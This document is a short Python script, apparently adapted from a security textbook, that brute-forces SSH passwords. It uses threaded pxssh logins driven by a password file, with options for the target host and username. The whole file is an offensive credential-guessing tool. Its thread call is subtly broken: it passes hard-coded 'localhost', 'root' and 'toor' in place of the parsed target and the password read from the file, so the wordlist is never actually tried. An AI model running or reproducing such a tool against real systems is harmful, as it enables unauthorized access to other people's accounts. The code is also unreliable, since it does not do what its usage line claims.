#!/usr/bin/env python
import os
import time
import argparse
from pexpect import pxssh
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


# Return SSH connection for given username@host -p password
def connect(host, user, password, release):
    global Found
    global Fails

    s = pxssh.pxssh()
    try:
        s.login(host, user, password)
        print("[+] Password found: " + password)
        Found = True
    except Exception as e:
        Fails += 1
        if 'read_nonblocking' in str(e):
            time.sleep(5)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
        if Fails < 5:
            connect(host, user, password, False)
        else:
            print("[!] Exiting: Too Many Socket Timeouts.")
    finally:
        if release:
            connection_lock.release()
    return s


if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage='%(prog)s -H <target host> -u <username> -F <password file>')

    parser.add_argument('-H', dest='target_host', type=str,
                        required=True, help='Specify target host.')
    parser.add_argument('-u', dest='username', type=str,
                        required=True, help='Specify account username.')
    parser.add_argument('-F', dest='password_file', type=str,
                        required=True, help='Specify file containing all possible passwords.')

    options = parser.parse_args()

    fn = open(options.password_file, "r")
    for line in fn.readlines():
        Fails = 0
        if Found:
            print("[*] Exiting: Password found")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("[-] Testing: " + password)
        t = Thread(target=connect, args=("localhost", "root", "toor", True))
        child = t.start()
